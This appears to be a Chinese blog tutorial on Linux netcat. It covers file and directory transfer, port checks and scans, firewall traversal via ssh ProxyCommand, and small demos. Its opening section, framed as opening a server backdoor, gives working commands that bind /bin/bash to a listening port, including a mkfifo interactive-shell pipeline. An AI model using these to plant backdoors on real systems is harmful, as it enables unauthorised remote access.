Linux netcat nc<br />`netcat`这个工具，简称`nc`，是Linux上一个非常强大的工具（当然也有windows版本）。由于它能力实在太强，有些公司甚至对他进行了隔离（quarantined）。比如`rename`掉，或者给`000`的权限。因为它很容易可以在服务器上开一个后门（backdoor)，并且及其方便。<br />查看nc命令的位置
```bash
whereis nc
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598927441099-fe2b8b7b-b891-4451-b0a7-76827c907556.png#align=left&display=inline&height=72&originHeight=216&originWidth=3323&size=186040&status=done&style=none&width=1107.6666666666667)<br />使用file命令来看一下它的属性。结果发现它是一个链接文件。
```bash
file /usr/bin/nc
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598927502417-7e33e0f3-a73e-4531-85d4-8b17bc30f724.png#align=left&display=inline&height=108&originHeight=323&originWidth=3323&size=327822&status=done&style=none&width=1107.6666666666667)
<a name="blpJi"></a>
### 1、为服务器开后门
<a name="FrFZP"></a>
#### ①服务端通过nc命令开放端口
下面的命令，将在机器上开放`5879`端口。服务端：
```bash
nc -l -vv -p 5879 -e /bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598927602977-365a3bee-935c-413f-a8a7-59226742496d.png#align=left&display=inline&height=119&originHeight=358&originWidth=3323&size=371325&status=done&style=none&width=1107.6666666666667)<br />这个过程叫做反弹shell，远程就可以使用nc命令连接，执行一些操作。
<a name="GZPbu"></a>
#### ②客户端通过nc连接主机
```bash
nc -v 127.0.0.1 5879
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598927720325-adf82631-82b9-40e7-9241-db4cc0d30212.png#align=left&display=inline&height=254&originHeight=762&originWidth=3323&size=864604&status=done&style=none&width=1107.6666666666667)<br />客户端连接成功后，在服务端显示操作日志<br />![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598927826353-d3ba7342-e74c-43b0-8bd2-7fec464ef37c.png#align=left&display=inline&height=198&originHeight=595&originWidth=3323&size=660885&status=done&style=none&width=1107.6666666666667)
<a name="421c9382"></a>
#### ③关闭客户端时服务端一同关闭，使用-k参数可以保持服务端监听
想要服务端继续监听，可以加上参数`-k`。
<a name="OZLKR"></a>
#### ④客户端连接时显示命令执行终端
服务器端，执行下面两个命令，这就构造了一个循环。
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l  5879 > /tmp/f
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598928194512-f9245d03-cc26-447b-b7f9-8a0cb9a6e639.png#align=left&display=inline&height=72&originHeight=216&originWidth=3323&size=196170&status=done&style=none&width=1107.6666666666667)<br />然后通过客户端连接服务端，会显示命令终端<br />![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598928308877-0724f527-7b31-4234-8721-d13c87646477.png#align=left&display=inline&height=307&originHeight=921&originWidth=3323&size=1106050&status=done&style=none&width=1107.6666666666667)
<a name="5yL6d"></a>
#### ⑤端口扫描

<a name="4E7JI"></a>
### 2、文件和目录传输
<a name="v2vDC"></a>
#### ①服务端开启端口监听并重定向到文件
```bash
nc -l 5879 > file
```
<a name="WPcWe"></a>
#### ②客户端启动连接并使用反向箭头发送文件
```bash
nc -v 192.16.1.54 5879 < redis-5.0.5.tar.gz
```
由于没有使用rsa加密，文件传输的更快了。<br />查看文件的MD5完全匹配
```bash
MD5 (redis-5.0.5.tar.gz) = 224cabf26d622f37528b398762e1578c

md5sum file
224cabf26d622f37528b398762e1578c  file
```
<a name="9nk6O"></a>
#### ③目录的传输
<a name="eeEqn"></a>
##### 客户端将文件夹压缩为文件通过管道传递给nc
nc命令接收了打包的文件
```bash
tar cfz - redis-5.0.5 |  nc -v 192.16.1.54 5879
```
<a name="tvjjW"></a>
##### 服务端接收压缩文件并解压为目录
把nc的输出，使用管道交给tar命令处理。`xfvz`和`cvfz`是一对参数
```bash
nc -l 5879  | tar xfvz -
```
<a name="JtbSK"></a>
### 3、网络连通性检测
<a name="8IfZG"></a>
##### 测试指定端口的连通性
想要判断服务器的tomcat端口是否开启，不需要登陆到服务器上，然后再`ps`一下看一下进程，或者使用`netstat -antl`看一下监听的端口。<br />使用nc就可以了。<br />只需要简单的打上ip和端口，就能知道结果。
```bash
$ nc -vvv baidu.com 443
Connection to baidu.com port 443 [tcp/https] succeeded!
```
<a name="Nrc6x"></a>
##### 通过nc扫描主机端口的开放情况
```bash
nc -vzw 2 192.16.1.54 8888-9999
```
<a name="BwMWx"></a>
### 4、防火墙穿透
比如下面这张图。想要访问`tongariro`的这台机器，但是没有权限的。它只能通过`aoraki`的防火墙访问。同时，`aoraki`也只能接受来自`ruapehu`的请求。<br />![](https://cdn.nlark.com/yuque/0/2020/webp/396745/1598933449085-7ccbf4a3-f781-43d2-8b9d-f4ad4d5b9f01.webp#align=left&display=inline&height=501&originHeight=501&originWidth=566&size=0&status=done&style=none&width=566)<br />通过组合ssh命令可以达到这个效果。
```bash
ssh -A -t ruapehu.example.com ssh -A -t aoraki ssh -A tongariro
```
通过ssh的`ProxyCommand`，可以完成简单的配置。<br />使用下面的命令可以快速打通这个通道。
```bash
ssh -oProxyCommand="ssh host1 nc host2 22" host2
```
<a name="VFlAH"></a>
### 5、其他
<a name="3e1ac"></a>
#### 时间服务器
实现一个简单的时间服务器。web浏览器访问即可获取。
```bash
ncat -lkp 8976 --sh-exec 'echo -ne "HTTP/1.0 200 OK\r\n\r\nThe date is "; date;'
```
![image.png](https://cdn.nlark.com/yuque/0/2020/png/396745/1598933737433-76415904-5dd0-435f-8a93-e8a49ff3be83.png#align=left&display=inline&height=160&originHeight=479&originWidth=1197&size=63127&status=done&style=shadow&width=399)
<a name="txJlj"></a>
#### 远程视频服务
服务端
```bash
arecord -f cd -c 2 | lame -b128 - - | netcat -u your-ip 6881 | mpg123 -
```
客户端
```bash
arecord -f cd -c 2 | lame -b128 - - | netcat -u -l 6881 | mpg123 -****
```

